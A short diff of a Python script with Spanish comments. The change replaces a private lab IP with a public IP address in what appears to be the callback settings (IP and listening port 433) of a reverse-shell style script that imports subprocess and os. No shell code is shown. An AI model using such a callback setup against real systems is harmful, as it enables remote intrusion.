@@ -3,7 +3,7 @@ import subprocess
 import os
 
 # Configuración de la conexión
-ip = "192.168.56.105"  # Cambia por tu IP
+ip = "186.52.254.62"  # Cambia por tu IP
 port = 433  # Cambia por el puerto que escucharás
 
 # Crear el socket
